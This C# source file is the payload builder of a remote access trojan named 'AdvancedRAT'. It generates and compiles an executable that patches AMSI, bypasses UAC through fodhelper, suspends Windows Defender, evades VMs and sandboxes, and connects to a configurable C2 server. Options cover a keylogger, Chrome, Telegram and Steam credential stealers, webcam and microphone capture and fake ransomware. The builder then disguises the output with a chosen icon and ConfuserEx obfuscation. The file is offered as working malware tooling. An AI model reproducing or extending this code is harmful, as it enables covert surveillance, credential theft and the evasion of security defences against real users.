using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AdvancedRAT.UI.Builder
{
    public partial class FormBuilder : Form
    {
        public FormBuilder()
        {
            InitializeComponent();
            InitializeForm();
        }

        private void InitializeForm()
        {
            // Set default values for the form controls
            tbC2Server.Text = "127.0.0.1";
            tbC2Port.Text = "4444";
            tbAESKey.Text = GenerateRandomAESKey();
            
            // Initialize all checkboxes
            cbAMSI.Checked = true;
            cbUAC.Checked = true;
            cbDefender.Checked = true;
            cbAntiVM.Checked = true;
            cbChrome.Checked = true;
            cbTelegram.Checked = true;
            cbSteam.Checked = true;
            cbRansomware.Checked = false; // Disabled by default for safety
            cbMJPEG.Checked = true;
            cbMicTrigger.Checked = true;
            cbOCR.Checked = true;
            cbSelfDestruct.Checked = false; // Disabled by default for safety
        }

        private string GenerateRandomAESKey()
        {
            var random = new Random();
            var sb = new StringBuilder();
            for (int i = 0; i < 32; i++) // 32 characters for 256-bit key
            {
                sb.Append((char)random.Next(65, 91)); // A-Z
            }
            return sb.ToString();
        }

        private async void btnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                btnBuild.Enabled = false;
                lblStatus.Text = "Building payload...";

                // Generate payload based on selected options
                string payloadCode = GeneratePayloadCode();

                // Compile the payload
                string outputPath = await CompilePayload(payloadCode);

                if (!string.IsNullOrEmpty(outputPath))
                {
                    lblStatus.Text = $"Payload built successfully: {outputPath}";
                    
                    // Optionally apply icon and obfuscation
                    if (tbIconPath.Text.Length > 0 && File.Exists(tbIconPath.Text))
                    {
                        ApplyIcon(outputPath, tbIconPath.Text);
                    }
                    
                    ApplyObfuscation(outputPath);
                }
                else
                {
                    lblStatus.Text = "Build failed!";
                }
            }
            catch (Exception ex)
            {
                lblStatus.Text = $"Build error: {ex.Message}";
            }
            finally
            {
                btnBuild.Enabled = true;
            }
        }

        private string GeneratePayloadCode()
        {
            var sb = new StringBuilder();
            
            // Base payload structure
            sb.AppendLine("using System;");
            sb.AppendLine("using System.Threading.Tasks;");
            sb.AppendLine("using AdvancedRAT.Core.Communication;");
            sb.AppendLine("using AdvancedRAT.Core.Security;");
            sb.AppendLine("using AdvancedRAT.Core.Modules;");
            sb.AppendLine("");
            sb.AppendLine("namespace AdvancedRAT");
            sb.AppendLine("{");
            sb.AppendLine("    class Program");
            sb.AppendLine("    {");
            sb.AppendLine("        [STAThread]");
            sb.AppendLine("        static void Main(string[] args)");
            sb.AppendLine("        {");

            // Add AMSI patch if enabled
            if (cbAMSI.Checked)
            {
                sb.AppendLine("            AMSEPatch.PatchAMSI();");
                sb.AppendLine("            AMSEPatch.PatchAMSIInitFailed();");
            }

            // Add UAC bypass if enabled
            if (cbUAC.Checked)
            {
                sb.AppendLine("            UACBypass.BypassUsingFodHelper();");
            }

            // Add Defender suspension if enabled
            if (cbDefender.Checked)
            {
                sb.AppendLine("            DefenderSuspender.SuspendMsMpEng();");
                sb.AppendLine("            DefenderSuspender.DisableDefenderServices();");
            }

            // Add Anti-VM checks if enabled
            if (cbAntiVM.Checked)
            {
                sb.AppendLine("            if (AntiVM.IsRunningInVM() || AntiVM.SandboxTimingCheck())");
                sb.AppendLine("            {");
                sb.AppendLine("                return; // Exit if in VM or sandbox");
                sb.AppendLine("            }");
            }

            // Add persistence if enabled
            if (cbPersistence.Checked)
            {
                sb.AppendLine("            // Add persistence mechanism here");
            }

            // Start communication channel
            sb.AppendLine($"            EncryptedChannel.C2_SERVER = \"{tbC2Server.Text}\";");
            sb.AppendLine($"            EncryptedChannel.C2_PORT = {tbC2Port.Text};");
            sb.AppendLine($"            EncryptedChannel.AES_KEY = System.Text.Encoding.UTF8.GetBytes(\"{tbAESKey.Text}\");");
            sb.AppendLine("            Task.Run(() => EncryptedChannel.StartListening());");

            // Add specific modules based on selections
            if (cbKeylogger.Checked)
            {
                sb.AppendLine("            Keylogger.StartLogging();");
            }

            if (cbScreenCapture.Checked)
            {
                sb.AppendLine("            // Screen capture module would be activated on command");
            }

            if (cbWebcam.Checked)
            {
                sb.AppendLine("            // Webcam module would be activated on command");
            }

            if (cbMicrophone.Checked)
            {
                sb.AppendLine("            // Microphone module would be activated on command");
            }

            if (cbChrome.Checked)
            {
                sb.AppendLine("            // Chrome stealer would be activated on command");
            }

            if (cbTelegram.Checked)
            {
                sb.AppendLine("            // Telegram stealer would be activated on command");
            }

            if (cbSteam.Checked)
            {
                sb.AppendLine("            // Steam stealer would be activated on command");
            }

            // Add trolling capabilities if enabled
            if (cbTrolling.Checked)
            {
                sb.AppendLine("            // Trolling capabilities available on command");
            }

            // Add fake ransomware if enabled
            if (cbRansomware.Checked)
            {
                sb.AppendLine("            // Fake ransomware available on command");
            }

            // Add self-destruct if enabled
            if (cbSelfDestruct.Checked)
            {
                sb.AppendLine("            // Self-destruct capability available on command");
            }

            sb.AppendLine("            // Keep main thread alive");
            sb.AppendLine("            Task.Delay(-1).Wait();");
            sb.AppendLine("        }");
            sb.AppendLine("    }");
            sb.AppendLine("}");

            return sb.ToString();
        }

        private async Task<string> CompilePayload(string payloadCode)
        {
            return await Task.Run(() =>
            {
                try
                {
                    // Define output path
                    string outputPath = Path.Combine(Path.GetTempPath(), $"AdvancedRAT_{DateTime.Now:yyyyMMdd_HHmmss}.exe");

                    // Create a temporary project directory
                    string tempDir = Path.Combine(Path.GetTempPath(), $"AdvancedRAT_Build_{Guid.NewGuid()}");
                    Directory.CreateDirectory(tempDir);

                    // Write the payload code to a temporary file
                    string sourceFile = Path.Combine(tempDir, "Program.cs");
                    File.WriteAllText(sourceFile, payloadCode);

                    // Create project file
                    string projectFile = Path.Combine(tempDir, "AdvancedRAT.csproj");
                    File.WriteAllText(projectFile, GenerateProjectFile());

                    // Compile using MSBuild
                    var startInfo = new ProcessStartInfo
                    {
                        FileName = "dotnet",
                        Arguments = $"build --output \"{Path.GetDirectoryName(outputPath)}\" --configuration Release",
                        WorkingDirectory = tempDir,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true
                    };

                    using (var process = Process.Start(startInfo))
                    {
                        string output = process.StandardOutput.ReadToEnd();
                        string error = process.StandardError.ReadToEnd();
                        process.WaitForExit();

                        if (process.ExitCode == 0)
                        {
                            // Find the compiled executable
                            string[] exeFiles = Directory.GetFiles(Path.GetDirectoryName(outputPath), "*.exe");
                            if (exeFiles.Length > 0)
                            {
                                return exeFiles[0];
                            }
                        }
                        else
                        {
                            MessageBox.Show($"Compilation failed:\n{error}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Compilation error: {ex.Message}", "Build Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

                return null;
            });
        }

        private string GenerateProjectFile()
        {
            var sb = new StringBuilder();
            sb.AppendLine("<Project Sdk=\"Microsoft.NET.Sdk\">");
            sb.AppendLine("");
            sb.AppendLine("  <PropertyGroup>");
            sb.AppendLine("    <OutputType>Exe</OutputType>");
            sb.AppendLine("    <TargetFramework>net48</TargetFramework>");
            sb.AppendLine("    <UseWPF>false</UseWPF>");
            sb.AppendLine("    <UseWindowsForms>false</UseWindowsForms>");
            sb.AppendLine("    <LangVersion>latest</LangVersion>");
            sb.AppendLine("    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>");
            sb.AppendLine("    <AssemblyTitle>AdvancedRAT</AssemblyTitle>");
            sb.AppendLine("    <Product>AdvancedRAT</Product>");
            sb.AppendLine("    <Description>Advanced Remote Administration Tool</Description>");
            sb.AppendLine("    <Copyright>Copyright © 2025</Copyright>");
            sb.AppendLine("    <AssemblyVersion>12.0.0.0</AssemblyVersion>");
            sb.AppendLine("    <FileVersion>12.0.0.0</FileVersion>");
            sb.AppendLine("  </PropertyGroup>");
            sb.AppendLine("");
            sb.AppendLine("</Project>");

            return sb.ToString();
        }

        private void ApplyIcon(string exePath, string icoPath)
        {
            try
            {
                // Use ResourceHacker to apply icon
                // This assumes ResourceHacker is available in PATH
                var startInfo = new ProcessStartInfo
                {
                    FileName = "ResourceHacker",
                    Arguments = $"-open \"{exePath}\" -save \"{exePath}\" -action addoverwrite -res \"{icoPath}\" -mask ICONGROUP,MAINICON,",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (var process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to apply icon: {ex.Message}", "Icon Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void ApplyObfuscation(string exePath)
        {
            try
            {
                // Apply ConfuserEx obfuscation
                // This assumes ConfuserEx is available
                string configPath = CreateConfuserConfig();
                
                var startInfo = new ProcessStartInfo
                {
                    FileName = "Confuser.CLI",
                    Arguments = $"\"{configPath}\" -o \"{exePath}\" \"{exePath}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (var process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to apply obfuscation: {ex.Message}", "Obfuscation Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private string CreateConfuserConfig()
        {
            string configPath = Path.Combine(Path.GetTempPath(), "confuser_config.cr");
            
            var sb = new StringBuilder();
            sb.AppendLine("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
            sb.AppendLine("<configuration>");
            sb.AppendLine("  <appSettings>");
            sb.AppendLine("    <add key=\"outputDir\" value=\"./\" />");
            sb.AppendLine("  </appSettings>");
            sb.AppendLine("  <rules>");
            sb.AppendLine("    <rule pattern=\"assembly('*')\" inherit=\"false\">");
            sb.AppendLine("      <protection id=\"constants\" />");
            sb.AppendLine("      <protection id=\"ctrl-flow\" />");
            sb.AppendLine("      <protection id=\"ref-proxy\" />");
            sb.AppendLine("      <protection id=\"anti-ildasm\" />");
            sb.AppendLine("      <protection id=\"anti-tamper\" />");
            sb.AppendLine("      <protection id=\"resources\" />");
            sb.AppendLine("      <protection id=\"rename\" />");
            sb.AppendLine("    </rule>");
            sb.AppendLine("  </rules>");
            sb.AppendLine("</configuration>");

            File.WriteAllText(configPath, sb.ToString());
            return configPath;
        }

        private void btnSelectIcon_Click(object sender, EventArgs e)
        {
            using (var dialog = new OpenFileDialog())
            {
                dialog.Filter = "Icon files (*.ico)|*.ico|All files (*.*)|*.*";
                if (dialog.ShowDialog() == DialogResult.OK)
                {
                    tbIconPath.Text = dialog.FileName;
                }
            }
        }
    }
}